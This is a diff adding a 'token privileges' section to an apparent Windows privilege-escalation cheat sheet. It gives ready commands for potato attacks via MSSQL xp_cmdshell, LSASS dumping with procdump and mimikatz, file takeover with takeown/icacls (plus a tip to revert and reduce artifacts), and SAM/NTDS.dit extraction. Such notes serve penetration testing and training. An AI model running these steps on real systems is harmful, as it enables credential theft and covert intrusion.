@@ -51,6 +51,26 @@ PrintSpoofer.exe -i -c cmd         # -c runs a command as SYSTEM (reverse-shell 
 ```
 Service accounts (IIS `iis apppool\...`, MSSQL via `xp_cmdshell`) almost always have SeImpersonate -> instant SYSTEM. This is the #1 Windows service-to-SYSTEM move.
 
+### Token privileges — detail
+**Privilege vs access right:** a *privilege* is a system-wide action (debug any process); an *access right* is object-specific (read this file). `whoami /priv` lists privileges — but note **a privilege can be present yet disabled**; enable all with EnableAllTokenPrivs.ps1. Detection: Event ID **4672** (special privileges assigned).
+
+- **SeImpersonate** (web/DB service accounts): reach a shell, confirm `whoami /priv`, then potato to SYSTEM. Via MSSQL:
+  ```text
+  mssqlclient.py <user>@<host> -windows-auth   # enable_xp_cmdshell ; xp_cmdshell whoami /priv
+  # then run PrintSpoofer/GodPotato from xp_cmdshell (-c runs a command as SYSTEM)
+  ```
+- **SeDebug**: open any process → dump LSASS (`procdump -ma lsass.exe lsass.dmp` → mimikatz `sekurlsa::logonpasswords`, or pypykatz offline), or spawn SYSTEM from a parent PID.
+- **SeTakeOwnership**: take + re-ACL a restricted file to read it:
+  ```text
+  takeown /f <file>
+  icacls <file> /grant <me>:F
+  type <file>
+  icacls <file> /reset          # revert after (reduce artifacts)
+  ```
+- **SeBackup/SeRestore**: backup-read any file → copy SAM+SYSTEM or NTDS.dit for offline hash extraction.
+
+> These map one-to-one: SeImpersonate→potato, SeDebug→LSASS, SeBackup→NTDS/SAM, SeTakeOwnership→read-any-file. Reading `whoami /priv` tells you which path is open before you try anything.
+
 ## Credential dumping
 ```text
 # LSASS (plaintext creds / NTLM hashes) - needs admin/SeDebug
